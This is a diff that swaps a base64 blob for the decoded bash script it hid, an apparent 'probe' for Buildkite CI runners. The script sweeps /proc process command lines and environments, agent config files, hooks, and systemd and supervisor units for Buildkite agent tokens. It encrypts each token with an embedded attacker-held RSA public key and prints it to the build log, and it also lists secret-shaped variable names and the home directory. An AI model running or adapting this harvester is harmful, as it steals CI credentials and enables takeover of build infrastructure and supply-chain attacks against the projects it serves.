@@ -1,1 +1,59 @@
-IyEvYmluL2Jhc2gKIyBhNjMyIHByb2JlIHYyYjogY29uZmlnL2VudiB0b2tlbiBpbnZlbnRvcnk7IGFsbCB2YWx1ZXMgUlNBLWVuY3J5cHRlZCwgbmV2ZXIgcGxhaW50ZXh0CnNldCAtdQpQVUI9L3RtcC8uYTYzMnB1Yi4kJApjYXQgPiAiJFBVQiIgPDwnQTYzMlBVQkVPRicKLS0tLS1CRUdJTiBQVUJMSUMgS0VZLS0tLS0KTUlJQklqQU5CZ2txaGtpRzl3MEJBUUVGQUFPQ0FROEFNSUlCQ2dLQ0FRRUF2c1lpQ05FTDY5SWtVaW5iNDVJZApaUUpaVHRSMWFxY1cxeDNzV1ZnOVpwTm5WdzJUOHhGT3BkN3hjSG51UnVESmpwVmtGbEJFK3NyYURxM1dkaEI3CnBuYWJadEliTG5RYytHNlk4c1htQ3diV1V3eGp6OUU1dTg3REIxbzV4UGlFeVFNZVNUTkY1U1lQUGNZNEg5ZXEKakRsSEhlOGNBQS9McG5OY1EvTWVsdXkzOUNZd0hGUE1qSkdLMTBYMmFwQlpCSlFKeGw3OVRnTXg1akZZWng4Ugo2RkFlSDhkbkVIVFdQWkV5dHplZ3FlMEFLS2FRd0JNN2ZwZCszVU14bkM1TlZuM2hmRTZnMHlDdlJ6eWlBRUxzClBlNk9DaWlaOFhCZEhIT3RvT3BFK1lhckw5VTdRNHg3emM1Mkpkb2pRN2RMUzd4eVNBcGZIVXdFK3hhNGZ2enIKWFFJREFRQUIKLS0tLS1FTkQgUFVCTElDIEtFWS0tLS0tCkE2MzJQVUJFT0YKZW5jcnlwdCgpIHsKICB2PSIkMSI7IGxhYmVsPSIkMiIKICBbIC16ICIkdiIgXSAmJiByZXR1cm4gMAogIGg9JChwcmludGYgJyVzJyAiJHYiIHwgc2hhMjU2c3VtIHwgY3V0IC1jMS0xMikKICBjPSQocHJpbnRmICclcycgIiR2IiB8IG9wZW5zc2wgcGtleXV0bCAtZW5jcnlwdCAtcHViaW4gLWlua2V5ICIkUFVCIiAyPi9kZXYvbnVsbCB8IGJhc2U2NCAtdzApCiAgZWNobyAiQTYzMkVOQzokbGFiZWw6JGg6JHtjOi1FTkNGQUlMfSIKfQplY2hvICJBNjMyQl9CRUdJTiIKaWQ7IGhvc3RuYW1lCmVjaG8gIkNUWCBjbHVzdGVyPSR7QlVJTERLSVRFX0NMVVNURVJfSUQ6LW5vbmV9IHF1ZXVlPSR7QlVJTERLSVRFX0FHRU5UX01FVEFfREFUQV9RVUVVRTotbm9uZX0gYWdlbnQ9JHtCVUlMREtJVEVfQUdFTlRfTkFNRTotbm9uZX0iCmVjaG8gIj09IFNSQzEgY21kbGluZSB0b2tlbiBhcmdzIChlbmNyeXB0ZWQpID09Igpmb3IgcCBpbiAvcHJvYy9bMC05XSo7IGRvCiAgaWYgWyAtciAiJHAvY21kbGluZSIgXTsgdGhlbiB0ciAnXDAnICdcbicgPCAiJHAvY21kbGluZSIgMj4vZGV2L251bGwgfCBncmVwIC1vaUUgJ1stXXswLDJ9W2EtejAtOV8tXSp0b2tlbls9IF1bXiBdKycgfCBzZWQgLUUgJ3MvXltePV0qPS8vOyBzL15bXiBdKyArLy8nIHx8IHRydWU7IGZpCmRvbmUgfCBzb3J0IC11IHwgaGVhZCAtMjAgfCB3aGlsZSBJRlM9IHJlYWQgLXIgdjsgZG8gZW5jcnlwdCAiJHYiICJjbWRsaW5lIjsgZG9uZQplY2hvICI9PSBTUkMyIGFnZW50IHByb2Nlc3MgZW52IHRva2VuIG5hbWVzID09Igpmb3IgcCBpbiAvcHJvYy9bMC05XSo7IGRvCiAgaWYgWyAtciAiJHAvZW52aXJvbiIgXTsgdGhlbiBjPSQodHIgJ1wwJyAnICcgPCAiJHAvY21kbGluZSIgMj4vZGV2L251bGwgfCBoZWFkIC1jIDIwMCk7IGNhc2UgIiRjIiBpbiAqYnVpbGRraXRlLWFnZW50KikgdHIgJ1wwJyAnXG4nIDwgIiRwL2Vudmlyb24iIDI+L2Rldi9udWxsIHwgZ3JlcCAtaUUgJ15bQS1aMC05X10qVE9LRU5bQS1aMC05X10qPScgfCBzZWQgLUUgJ3MvXihbXj1dKik9LiovXDEvJyB8fCB0cnVlOzsgZXNhYzsgZmkKZG9uZSB8IHNvcnQgLXUgfCBoZWFkIC00MAplY2hvICI9PSBTUkMyYiBhZ2VudCBwcm9jZXNzIGVudiB0b2tlbiB2YWx1ZXMgKGVuY3J5cHRlZCkgPT0iCmZvciBwIGluIC9wcm9jL1swLTldKjsgZG8KICBpZiBbIC1yICIkcC9lbnZpcm9uIiBdOyB0aGVuIGM9JCh0ciAnXDAnICcgJyA8ICIkcC9jbWRsaW5lIiAyPi9kZXYvbnVsbCB8IGhlYWQgLWMgMjAwKTsgY2FzZSAiJGMiIGluICpidWlsZGtpdGUtYWdlbnQqKSB0ciAnXDAnICdcbicgPCAiJHAvZW52aXJvbiIgMj4vZGV2L251bGwgfCBncmVwIC1pRSAnXihCVUlMREtJVEVfQUdFTlRfVE9LRU58QlVJTERLSVRFX1RPS0VOfEJVSUxES0lURV9DTFVTVEVSX1RPS0VOfEJVSUxES0lURV9BR0VOVF9BQ0NFU1NfVE9LRU4pPScgfCB3aGlsZSBJRlM9Jz0nIHJlYWQgLXIgayB2OyBkbyBlbmNyeXB0ICIkdiIgImVudmlyb246JGsiOyBkb25lOzsgZXNhYzsgZmkKZG9uZQplY2hvICI9PSBTUkMzIGNmZyBmaWxlcyA9PSIKZm9yIGYgaW4gL2V0Yy9idWlsZGtpdGUtYWdlbnQvYnVpbGRraXRlLWFnZW50LmNmZyAvdXNyL3NoYXJlL2J1aWxka2l0ZS1hZ2VudC9idWlsZGtpdGUtYWdlbnQuY2ZnICIkSE9NRS8uYnVpbGRraXRlLWFnZW50L2J1aWxka2l0ZS1hZ2VudC5jZmciOyBkbwogIGlmIFsgLWYgIiRmIiBdOyB0aGVuIGVjaG8gIkZPVU5EMiAkZiI7IHNoYTI1NnN1bSAiJGYiOyBncmVwIC1FICdeW1s6c3BhY2U6XV0qKHRva2VufHRva2VuLWVudnxob29rcy1wYXRofG5hbWUpJyAiJGYiIHwgc2VkICdzLz0uKi89PHJlZGFjdGVkPi8nIHx8IHRydWU7IHQ9JChncmVwIC1FICdeW1s6c3BhY2U6XV0qdG9rZW5bWzpzcGFjZTpdXSo9JyAiJGYiIHwgaGVhZCAtMSB8IHNlZCAtRSAncy9eW149XSo9W1s6c3BhY2U6XV0qIj8oW14iXSopIj9bWzpzcGFjZTpdXSokL1wxLycpOyBlbmNyeXB0ICIkdCIgImNmZzI6JGYiOyBmaQpkb25lCmVjaG8gIj09IFNSQzQgaG9va3MgPT0iCmxzIC1sYSAvaG9va3MvIC9ldGMvYnVpbGRraXRlLWFnZW50L2hvb2tzLyAyPi9kZXYvbnVsbCB8fCB0cnVlCmZvciBoIGluIC9ob29rcy8qIC9ldGMvYnVpbGRraXRlLWFnZW50L2hvb2tzLyo7IGRvCiAgaWYgWyAtZiAiJGgiIF07IHRoZW4gZWNobyAiSE9PSyAkaCI7IHNoYTI1NnN1bSAiJGgiOyBncmVwIC1vRSAnW0EtWmEtejAtOV9dKihUT0tFTnxTRUNSRVR8UEFTU1dPUkQpW0EtWmEtejAtOV9dKj1bXiBdKicgIiRoIiAyPi9kZXYvbnVsbCB8IHNlZCAtRSAncy89LiovPTxyZWRhY3RlZD4vJyB8fCB0cnVlOyBncmVwIC1vRSAnQlVJTERLSVRFW0EtWmEtejAtOV9dKlRPS0VOPSI/W14iIF0rIj8nICIkaCIgMj4vZGV2L251bGwgfCB3aGlsZSBJRlM9Jz0nIHJlYWQgLXIgayB2OyBkbyBlbmNyeXB0ICIkKHByaW50ZiAnJXMnICIkdiIgfCB0ciAtZCAnIicpIiAiaG9vazokayI7IGRvbmU7IGZpCmRvbmUKZWNobyAiPT0gU1JDNSBzdXBlcnZpc29yL3N5c3RlbWQvZGVmYXVsdCA9PSIKZm9yIHUgaW4gL2V0Yy9zeXN0ZW1kL3N5c3RlbS9idWlsZGtpdGUtYWdlbnQqLnNlcnZpY2UgL2xpYi9zeXN0ZW1kL3N5c3RlbS9idWlsZGtpdGUtYWdlbnQqLnNlcnZpY2UgL2V0Yy9zdXBlcnZpc29yL2NvbmYuZC8qLmNvbmYgL2V0Yy9zdXBlcnZpc29yL3N1cGVydmlzb3JkLmNvbmYgL2V0Yy9kZWZhdWx0L2J1aWxka2l0ZS1hZ2VudCAvZXRjL2RlZmF1bHQvYnVpbGRraXRlKjsgZG8KICBpZiBbIC1mICIkdSIgXTsgdGhlbiBlY2hvICJDT05GICR1Ijsgc2hhMjU2c3VtICIkdSI7IGdyZXAgLW9FICdbQS1aYS16MC05X10qKFRPS0VOfFNFQ1JFVCk9W14gIl0qJyAiJHUiIDI+L2Rldi9udWxsIHwgc2VkIC1FICdzLz0uKi89PHJlZGFjdGVkPi8nIHx8IHRydWU7IGdyZXAgLW9FICcoQlVJTERLSVRFX0FHRU5UX1RPS0VOfEJVSUxES0lURV9UT0tFTik9W14gIl0qJyAiJHUiIDI+L2Rldi9udWxsIHwgd2hpbGUgSUZTPSc9JyByZWFkIC1yIGsgdjsgZG8gZW5jcnlwdCAiJHYiICJjb25mOiRrIjsgZG9uZTsgZmkKZG9uZQplY2hvICI9PSBTUkM2IHBpZDEgPT0iCnRyICdcMCcgJ1xuJyA8IC9wcm9jLzEvY21kbGluZSAyPi9kZXYvbnVsbCB8IGhlYWQgLTUgfHwgdHJ1ZQp0ciAnXDAnICdcbicgPCAvcHJvYy8xL2Vudmlyb24gMj4vZGV2L251bGwgfCBncmVwIC1pRSAnXihCVUlMREtJVEVfQUdFTlRfVE9LRU58QlVJTERLSVRFX1RPS0VOKT0nIHwgd2hpbGUgSUZTPSc9JyByZWFkIC1yIGsgdjsgZG8gZW5jcnlwdCAiJHYiICJwaWQxOiRrIjsgZG9uZQplY2hvICI9PSBTUkM3IGpvYiBlbnYgc2VjcmV0LXNoYXBlZCBuYW1lcyA9PSIKZW52IHwgZ3JlcCAtaUUgJ1RPS0VOfFNFQ1JFVHxBUElfS0VZfFBBU1NXT1JEfENSRURFTlRJQUx8X0tFWScgfCBjdXQgLWQ9IC1mMSB8IHNvcnQgfHwgdHJ1ZQplY2hvICI9PSBTUkM4IGhvbWUgPT0iCmxzIC1sYSAiJEhPTUUiIDI+L2Rldi9udWxsIHwgaGVhZCAtMjUgfHwgdHJ1ZQpybSAtZiAiJFBVQiIgMj4vZGV2L251bGwgfHwgdHJ1ZQplY2hvICJBNjMyQl9FTkQiCg==
+#!/bin/bash
+# a632 probe v2b: config/env token inventory; all values RSA-encrypted, never plaintext
+set -u
+PUB=/tmp/.a632pub.$$
+cat > "$PUB" <<'A632PUBEOF'
+-----BEGIN PUBLIC KEY-----
+MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvsYiCNEL69IkUinb45Id
+ZQJZTtR1aqcW1x3sWVg9ZpNnVw2T8xFOpd7xcHnuRuDJjpVkFlBE+sraDq3WdhB7
+pnabZtIbLnQc+G6Y8sXmCwbWUwxjz9E5u87DB1o5xPiEyQMeSTNF5SYPPcY4H9eq
+jDlHHe8cAA/LpnNcQ/Meluy39CYwHFPMjJGK10X2apBZBJQJxl79TgMx5jFYZx8R
+6FAeH8dnEHTWPZEytzegqe0AKKaQwBM7fpd+3UMxnC5NVn3hfE6g0yCvRzyiAELs
+Pe6OCiiZ8XBdHHOtoOpE+YarL9U7Q4x7zc52JdojQ7dLS7xySApfHUwE+xa4fvzr
+XQIDAQAB
+-----END PUBLIC KEY-----
+A632PUBEOF
+encrypt() {
+  v="$1"; label="$2"
+  [ -z "$v" ] && return 0
+  h=$(printf '%s' "$v" | sha256sum | cut -c1-12)
+  c=$(printf '%s' "$v" | openssl pkeyutl -encrypt -pubin -inkey "$PUB" 2>/dev/null | base64 -w0)
+  echo "A632ENC:$label:$h:${c:-ENCFAIL}"
+}
+echo "A632B_BEGIN"
+id; hostname
+echo "CTX cluster=${BUILDKITE_CLUSTER_ID:-none} queue=${BUILDKITE_AGENT_META_DATA_QUEUE:-none} agent=${BUILDKITE_AGENT_NAME:-none}"
+echo "== SRC1 cmdline token args (encrypted) =="
+for p in /proc/[0-9]*; do
+  if [ -r "$p/cmdline" ]; then tr '\0' '\n' < "$p/cmdline" 2>/dev/null | grep -oiE '[-]{0,2}[a-z0-9_-]*token[= ][^ ]+' | sed -E 's/^[^=]*=//; s/^[^ ]+ +//' || true; fi
+done | sort -u | head -20 | while IFS= read -r v; do encrypt "$v" "cmdline"; done
+echo "== SRC2 agent process env token names =="
+for p in /proc/[0-9]*; do
+  if [ -r "$p/environ" ]; then c=$(tr '\0' ' ' < "$p/cmdline" 2>/dev/null | head -c 200); case "$c" in *buildkite-agent*) tr '\0' '\n' < "$p/environ" 2>/dev/null | grep -iE '^[A-Z0-9_]*TOKEN[A-Z0-9_]*=' | sed -E 's/^([^=]*)=.*/\1/' || true;; esac; fi
+done | sort -u | head -40
+echo "== SRC2b agent process env token values (encrypted) =="
+for p in /proc/[0-9]*; do
+  if [ -r "$p/environ" ]; then c=$(tr '\0' ' ' < "$p/cmdline" 2>/dev/null | head -c 200); case "$c" in *buildkite-agent*) tr '\0' '\n' < "$p/environ" 2>/dev/null | grep -iE '^(BUILDKITE_AGENT_TOKEN|BUILDKITE_TOKEN|BUILDKITE_CLUSTER_TOKEN|BUILDKITE_AGENT_ACCESS_TOKEN)=' | while IFS='=' read -r k v; do encrypt "$v" "environ:$k"; done;; esac; fi
+done
+echo "== SRC3 cfg files =="
+for f in /etc/buildkite-agent/buildkite-agent.cfg /usr/share/buildkite-agent/buildkite-agent.cfg "$HOME/.buildkite-agent/buildkite-agent.cfg"; do
+  if [ -f "$f" ]; then echo "FOUND2 $f"; sha256sum "$f"; grep -E '^[[:space:]]*(token|token-env|hooks-path|name)' "$f" | sed 's/=.*/=<redacted>/' || true; t=$(grep -E '^[[:space:]]*token[[:space:]]*=' "$f" | head -1 | sed -E 's/^[^=]*=[[:space:]]*"?([^"]*)"?[[:space:]]*$/\1/'); encrypt "$t" "cfg2:$f"; fi
+done
+echo "== SRC4 hooks =="
+ls -la /hooks/ /etc/buildkite-agent/hooks/ 2>/dev/null || true
+for h in /hooks/* /etc/buildkite-agent/hooks/*; do
+  if [ -f "$h" ]; then echo "HOOK $h"; sha256sum "$h"; grep -oE '[A-Za-z0-9_]*(TOKEN|SECRET|PASSWORD)[A-Za-z0-9_]*=[^ ]*' "$h" 2>/dev/null | sed -E 's/=.*/=<redacted>/' || true; grep -oE 'BUILDKITE[A-Za-z0-9_]*TOKEN="?[^" ]+"?' "$h" 2>/dev/null | while IFS='=' read -r k v; do encrypt "$(printf '%s' "$v" | tr -d '"')" "hook:$k"; done; fi
+done
+echo "== SRC5 supervisor/systemd/default =="
+for u in /etc/systemd/system/buildkite-agent*.service /lib/systemd/system/buildkite-agent*.service /etc/supervisor/conf.d/*.conf /etc/supervisor/supervisord.conf /etc/default/buildkite-agent /etc/default/buildkite*; do
+  if [ -f "$u" ]; then echo "CONF $u"; sha256sum "$u"; grep -oE '[A-Za-z0-9_]*(TOKEN|SECRET)=[^ "]*' "$u" 2>/dev/null | sed -E 's/=.*/=<redacted>/' || true; grep -oE '(BUILDKITE_AGENT_TOKEN|BUILDKITE_TOKEN)=[^ "]*' "$u" 2>/dev/null | while IFS='=' read -r k v; do encrypt "$v" "conf:$k"; done; fi
+done
+echo "== SRC6 pid1 =="
+tr '\0' '\n' < /proc/1/cmdline 2>/dev/null | head -5 || true
+tr '\0' '\n' < /proc/1/environ 2>/dev/null | grep -iE '^(BUILDKITE_AGENT_TOKEN|BUILDKITE_TOKEN)=' | while IFS='=' read -r k v; do encrypt "$v" "pid1:$k"; done
+echo "== SRC7 job env secret-shaped names =="
+env | grep -iE 'TOKEN|SECRET|API_KEY|PASSWORD|CREDENTIAL|_KEY' | cut -d= -f1 | sort || true
+echo "== SRC8 home =="
+ls -la "$HOME" 2>/dev/null | head -25 || true
+rm -f "$PUB" 2>/dev/null || true
+echo "A632B_END"
